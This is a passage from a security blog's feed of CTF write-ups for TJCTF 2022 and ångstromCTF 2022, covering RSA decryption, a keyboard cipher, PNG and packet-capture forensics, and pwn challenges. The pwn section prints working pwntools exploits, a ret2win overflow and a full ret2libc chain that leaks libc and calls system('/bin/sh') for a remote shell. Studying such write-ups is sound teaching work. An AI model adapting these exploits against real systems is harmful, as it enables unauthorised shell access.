class="line">e = 65537</span><br><span class="line">c1 = 257733734393970582988408159581244878149116</span><br><span class="line">c2 = 843105902970788695411197846605744081831851</span><br></pre></td></tr></table></figure><p>The flag is divided across two parts. Since we have c1 and c2 we need to find d1 and d2 to get the two parts of the flag.</p><p><strong>solver_part1.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">1216177716507739302616478655910148392804849</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1 = <span class="number">257733734393970582988408159581244878149116</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">1033247481589406269253</span></span><br><span class="line">q = <span class="number">1177043968824330681533</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d1= <span class="built_in">pow</span> (e , -<span class="number">1</span> , phi)</span><br><span class="line">flag1 = <span class="built_in">pow</span> (c1,d1,p*q)</span><br><span class="line"><span class="built_in">print</span> (long_to_bytes(flag1))</span><br></pre></td></tr></table></figure><p><strong>output</strong></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0d7f0485-5482-43fb-a090-4153c458aa2b%2FUntitled.png?id=4bfaef14-90d1-4899-a9a5-7d6155bb8db3&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=960&userId=&cache=v2" alt="Untitled"></p><p><strong>solver_part2.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">1216177716507739302616478655910148392804849</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">843105902970788695411197846605744081831851</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">1033247481589406269253</span></span><br><span class="line">q = <span class="number">1177043968824330681533</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d2= <span class="built_in">pow</span> (e , -<span class="number">1</span> , phi)</span><br><span class="line">flag2 = <span class="built_in">pow</span> (c2,d2,p*q)</span><br><span class="line"><span class="built_in">print</span> (long_to_bytes(flag2))</span><br></pre></td></tr></table></figure><p><strong>output</strong></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1aebe7da-c180-4533-93a5-dd1ec737b8bb%2FUntitled.png?id=cf14a747-7cfd-44ea-923f-173fc56c80b2&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=970&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : tjctf&#123;n0t_s0_S3cur3_Cryp70&#125;</code></p><h2 id="flimsy-fingered-latin-teacher"><a href="#flimsy-fingered-latin-teacher" class="headerlink" title="flimsy-fingered-latin-teacher"></a><strong>flimsy-fingered-latin-teacher</strong></h2><h3 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Oh no! My Latin teacher likes to touch type on her Dell laptop, but she has trouble keeping her fingers on the right keys in home row. The letters she&#x27;s typing out don&#x27;t really make sense. Can you help me understand what she&#x27;s saying so she doesn&#x27;t get upset when I come to her confused?</span><br><span class="line">ykvyg&#125;pp[djp,rtpelru[pdoyopm|</span><br></pre></td></tr></table></figure><p>This is a <strong><strong>Keyboard Shift Cipher</strong></strong> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7257cc31-c1da-416c-a0f2-c7a6ae26297d%2FUntitled.png?id=763531df-38d8-4fb4-8ead-a47dabc81eab&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1680&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : tjctf&#123;oopshomerowkeyposition&#125;</code></p><hr><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="vacation-1"><a href="#vacation-1" class="headerlink" title="vacation-1"></a><strong>vacation-1</strong></h2><h3 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Too much school, too much work, too much writing CTF challenges... can I just go on vacation?</span><br><span class="line"></span><br><span class="line">nc tjc.tf 31680</span><br></pre></td></tr></table></figure><p>This a simple ret2win challenge</p><p><strong>exploit.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shell = remote(<span class="string">&#x27;tjc.tf&#x27;</span>,<span class="number">31680</span>)</span><br><span class="line">shell.sendline(<span class="string">b&#x27;A&#x27;</span>* <span class="number">24</span> + p64(<span class="number">0x40101a</span>) + p64(<span class="number">0x401196</span>))</span><br><span class="line">shell.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F283fd543-5fa8-4cd1-a9c6-50de58d077be%2FUntitled.png?id=9146a405-e2ae-44a8-aded-35cd22013aba&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=930&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : tjctf&#123;wh4t_a_n1c3_plac3_ind33d!_7609d40aeba4844c&#125;</code></p><h2 id="vacation-2"><a href="#vacation-2" class="headerlink" title="vacation-2"></a><strong>vacation-2</strong></h2><h3 id="Challenge-Description-6"><a href="#Challenge-Description-6" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Travel agency said we can&#x27;t go there anymore...</span><br><span class="line"></span><br><span class="line">nc tjc.tf 31705</span><br></pre></td></tr></table></figure><p>Classic ret2libc challenge</p><p><strong>exploit.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([exe] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_ip</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="comment"># Launch process and send payload</span></span><br><span class="line">    p = process(exe)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;today?&#x27;</span>, payload)</span><br><span class="line">    <span class="comment"># Wait for the process to crash</span></span><br><span class="line">    p.wait()</span><br><span class="line">    <span class="comment"># Print out the address of EIP/RIP at the time of crashing</span></span><br><span class="line">    <span class="comment"># ip_offset = cyclic_find(p.corefile.pc)  # x86</span></span><br><span class="line">    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, <span class="number">4</span>))  <span class="comment"># x64</span></span><br><span class="line">    info(<span class="string">&#x27;located EIP/RIP offset at &#123;a&#125;&#x27;</span>.<span class="built_in">format</span>(a=ip_offset))</span><br><span class="line">    <span class="keyword">return</span> ip_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify your GDB script here for debugging</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">init-pwndbg</span></span><br><span class="line"><span class="string">break main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"><span class="comment"># This will automatically get context arch, bits, os etc</span></span><br><span class="line">elf = context.binary = ELF(exe, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># Enable verbose logging so we can see exactly what is being sent (info/debug)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment"># ===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib-C library</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)  # Local</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc6_2.31-0ubuntu9.7_amd64.so&#x27;</span>)  <span class="comment"># Remote</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pass in pattern_size, get back EIP/RIP offset</span></span><br><span class="line">offset = find_ip(cyclic(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start program</span></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># POP RDI and ret(stack alignment) from ropper</span></span><br><span class="line">pop_rdi = <span class="number">0x401243</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload to leak libc function</span></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    offset: [</span><br><span class="line">        pop_rdi,</span><br><span class="line">        elf.got.puts,</span><br><span class="line">        elf.plt.puts,</span><br><span class="line">        elf.symbols.main</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;today?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.recvline()  <span class="comment"># Receive the newline</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve got.puts address</span></span><br><span class="line">got_puts = unpack(io.recv()[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;leaked got_puts: %#x&quot;</span>, got_puts)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Subtract puts offset to get libc base</span></span><br><span class="line">libc.address = got_puts - libc.symbols.puts</span><br><span class="line">info(<span class="string">&quot;libc_base: %#x&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># System(/bin/sh)</span></span><br><span class="line">info(<span class="string">&quot;system_addr: %#x&quot;</span>, libc.symbols.system)</span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;bin_sh: %#x&quot;</span>, bin_sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload to get shell</span></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    offset: [</span><br><span class="line">        pop_rdi,</span><br><span class="line">        bin_sh,</span><br><span class="line">        ret,</span><br><span class="line">        libc.symbols.system</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Got Shell?</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F333bb09e-088e-40a3-8497-82282647133f%2FUntitled.png?id=cfeb8c20-bb85-4271-9052-dbb530e9d191&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1490&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : tjctf&#123;w3_g0_wher3_w3_w4nt_t0!_66f7020620e343ff&#125;</code></p><hr><h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="take-a-l"><a href="#take-a-l" class="headerlink" title="take-a-l"></a><strong>take-a-l</strong></h2><h3 id="Challenge-Description-7"><a href="#Challenge-Description-7" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I need W :angry:</span><br></pre></td></tr></table></figure><p>We are given a binary to work with</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F166084fb-7e29-4ef4-ac93-ffbc843034e7%2FUntitled.png?id=c2ab2023-e267-4462-93e6-bf2f38ae9e22&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><strong>main function</strong></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fca757fbd-5924-4b13-8c0d-dc8f88bb94b5%2FUntitled.png?id=7979a216-8a6c-45d2-929d-432fd9834a9f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1100&userId=&cache=v2" alt="Untitled"></p><p><strong>flag</strong></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9449555a-fbde-44cf-bd8c-48629ad92f85%2FUntitled.png?id=23f58373-a283-4ce6-80bc-edaf115a114d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1380&userId=&cache=v2" alt="Untitled"></p><p>After converting the flag values to decimal we get </p><p><code>102, 120, 113, 102, 116, 105, 117, 117, 117, 115, 127, 119, 96, 97, 97, 97, 97, 97, 97, 97, 97, 97, 39, 97, 111</code> </p><p>I just threw them to Cyberchef and converted them from decimal then I did XOR Brute Force</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F74d3de91-f437-4bb8-ac91-3d3212a8088c%2FUntitled.png?id=635c28fd-8c50-44cc-9dfe-dce509c46f28&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : tjctf&#123;gggamersssssssss5s&#125;</code></p><hr><p>I hope You enjoyed the writeups (&#x3D;^ ◡ ^&#x3D;)</p>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> forensics </tag>
            
            <tag> reversing </tag>
            
            <tag> cryptography </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ångstromCTF 2022 Writeups</title>
      <link href="/2022/05/04/angstromCTF-2022-Writeups/"/>
      <url>/2022/05/04/angstromCTF-2022-Writeups/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Confetti"><a href="#Confetti" class="headerlink" title="Confetti"></a><strong>Confetti</strong></h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;From the sky, drop like confetti All eyes on me, so V.I.P All of my dreams, from the sky, drop like confetti&quot; - Little Mix confetti.png</span><br><span class="line"></span><br><span class="line">Author: cavocado</span><br></pre></td></tr></table></figure><p>We are given a png file to work with</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F64904c6b-59f0-42b0-9ab8-a8ad6dc4979a%2FUntitled.png?id=5f6fc6ae-fc99-425f-868c-13866a286d38&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1270&userId=&cache=v2" alt="Untitled"></p><p>I tried running different tools like <strong>strings , exiftool , binwalk , zsteg …</strong> but nothing seems to give any results. Then I tried checking with <code>pngcheck</code> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fdee304c6-6918-43f8-9c56-511281f6280f%2FUntitled.png?id=3ff0c3aa-6857-4c46-8086-eb5dd882d4ef&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=940&userId=&cache=v2" alt="Untitled"></p><p>We notice that we got an error because the picture has additional data after the IEND chunk. Looking with <code>xxd</code> at the IEND chunk everything seems correct so why <strong>pngcheck</strong> threw that error “<em>additional data after IEND chunk”</em></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6170d28f-60e6-4a6c-950b-c6c7bc1cb2a0%2FUntitled.png?id=79d290aa-f1dd-4743-b7fc-512f5c7c9d05&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1130&userId=&cache=v2" alt="Untitled"></p><p>I decided to dump the whole hex values </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff647f1e8-58c9-4ad7-b04e-27aaef40a447%2FUntitled.png?id=b40c86f7-598b-497b-8f98-3c230d871d1e&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>then I searched for the IEND chunk. And I noticed that we have 3 IEND chunks , that’s weird because a single png image will have only one IEND chunk.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff647f1e8-58c9-4ad7-b04e-27aaef40a447%2FUntitled.png?id=b40c86f7-598b-497b-8f98-3c230d871d1e&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>If we got 3 IEND chunks that means there is a possibility to have 3 <code>PNG</code> headers (IHDR) which was the case. After every IEND an IHDR chunk starts</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2229e01a-1574-4853-8b9a-dd2faf3562e5%2FUntitled.png?id=958765dd-5735-4b69-8a6f-4bbe24c48f7a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1400&userId=&cache=v2" alt="Untitled"></p><p>That means that our image actually has 3 other images inside it so why we don’t extract all of them and look at them one by one. For this I used <strong>HxD</strong> which is an hexeditor for windows </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F44b44216-5740-43e1-b51a-b3abf2f41d43%2FUntitled.png?id=678e93c9-9b20-4575-b58a-143732885031&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1370&userId=&cache=v2" alt="Untitled"></p><p>I opened the <em>confetti.png</em> file and started extracting each image from the IHDR to the IEND </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F14a274b2-5457-4804-9763-623e00584de6%2FUntitled.png?id=99c2d8ee-0c22-441d-acb9-1e7aa3d45a35&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1070&userId=&cache=v2" alt="Untitled"></p><p>and then saved them in different file lets say <em>1.png</em> </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F78b765b3-81af-4a16-bc79-95f36810d668%2FUntitled.png?id=a3e49aa1-527a-4a14-9bfd-28d90720c6ed&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1250&userId=&cache=v2" alt="Untitled"></p><p> **I repeated this process until I got this image which contained our flag.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fdc2fa67b-81ed-42a8-a086-e59f3527cc62%2FUntitled.png?id=826258b2-d8bf-4753-86ba-1597b7c51fc2&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbb0a738b-9dd3-44d7-a16d-d6acb17e511a%2FUntitled.png?id=533440bd-fd7b-43f6-9a7a-8682806d225f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;confetti_4_u&#125;</code></p><h2 id="amongus"><a href="#amongus" class="headerlink" title="amongus"></a><strong>amongus</strong></h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">One of these is not like the others.</span><br><span class="line"></span><br><span class="line">Author: JoshDaBosh</span><br></pre></td></tr></table></figure><p>We are given an amongus.tar.gz archive to download </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8f554d5a-4199-4c16-b892-46295906c244%2FUntitled.png?id=9ff48ab8-da06-4e67-9d18-a1e08ad0398d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=890&userId=&cache=v2" alt="Untitled"></p><p>after extracting it using <code>tar -xvzf amongus.tar.gz</code> we get a folder called <em>out.</em> The folder contained so many .txt files which appears to be the flag if we get the right file.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd53904bc-5ac9-4822-812b-a5fea860b4ac%2FUntitled.png?id=6b2fcd27-4c0f-4f99-9753-e98f28627f98&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>I tried grepping for <em>actf</em> but nothing comes out , I tried looking at the content of some files but it looks like they contain no sense data.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa614237d-0773-4865-b0f3-2b31d05d8605%2FUntitled.png?id=3d9be8d6-1b61-4317-b1b0-c4658d24ddda&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1820&userId=&cache=v2" alt="Untitled"></p><p>Then I did <code>ls -al</code> to see if there is difference in the size of the files , maybe our flag is there somewhere. However, I noticed this file right here which is the only one different and like the description said “<em>One of these is not like the others.”</em></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2fad48d5-c214-4221-8299-e5c32a7b75bc%2FUntitled.png?id=de8a412f-9634-4754-8ebf-5abe88525d3d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1780&userId=&cache=v2" alt="Untitled"></p><p>So the name of that file is our flag.</p><p><code>Flag : actf&#123;look1ng_f0r_answers_in_the_p0uring_r4in_b21f9732f829&#125;</code></p><h2 id="Shark-1"><a href="#Shark-1" class="headerlink" title="Shark 1"></a><strong>Shark 1</strong></h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">My friend was passing notes during class. Can you find them? here</span><br><span class="line"></span><br><span class="line">Author: cavocado</span><br></pre></td></tr></table></figure><p>We are given a <code>shark1.pcapng</code> file to download. I opened it in Wireshark and started looking inside  the packets.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9b47a5a2-5a74-416d-966b-526e872941b5%2FUntitled.png?id=0cdb851c-a724-4adb-9472-b276026035ba&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>If we follow the 1st TCP packet we can find our flag :D  </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F48bbb896-563c-4317-a201-edf1ab9c80be%2FUntitled.png?id=f103c6db-a924-4493-91d9-86f423253da2&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=920&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;wireshark_doo_doo_doo_doo_doo_doo&#125;</code></p><h2 id="Shark-2"><a href="#Shark-2" class="headerlink" title="Shark 2"></a><strong>Shark 2</strong></h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">My friend hasn&#x27;t learned.</span><br><span class="line"></span><br><span class="line">Author: cavocado</span><br></pre></td></tr></table></figure><p>We are given <code>shark2.pcapng</code> file like the previous challenge. I did the same thing by following the TCP packets. I noticed this packet right here.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F5858a8c5-cc4f-459f-a749-91577e7f5047%2FUntitled.png?id=cb69ae96-7552-43ae-924c-dc52e2b1dd49&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=760&userId=&cache=v2" alt="Untitled"></p><p>So maybe our flag is in that image they are talking about since there is no other packets to look in.</p><p>The next packet had the image in it which is a .jpeg image (from the JFIF header)</p><p><img 